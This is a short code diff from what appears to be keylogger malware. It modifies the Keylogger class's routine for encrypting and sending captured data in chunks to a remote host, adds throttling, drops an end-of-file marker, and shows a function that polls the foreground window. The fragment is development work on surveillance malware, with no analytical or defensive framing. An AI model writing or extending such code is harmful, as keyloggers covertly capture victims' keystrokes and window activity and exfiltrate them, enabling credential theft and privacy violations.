@@ -151,11 +151,9 @@ class Keylogger:
         
         for chunk in chunks:
             self.encrypt_and_send(chunk)
+            time.sleep(0.001)
 
-        if filename:
-            self.encrypt_and_send("done sending file".encode(utils.ENCODING))
-
-    def encrypt_and_send(self, data):
+    def encrypt_and_send(self, data: bytes):
         encrypted_data = utils.encrypt(data)
         while True:
             try:
@@ -175,7 +173,6 @@ class Keylogger:
                 self.connected = False
                 logging.debug(err)
                 self.connect_to_host()
-        
 
 #--------------- POLLING FUNCTIONS ---------------#
     def check_foreground_window(self):
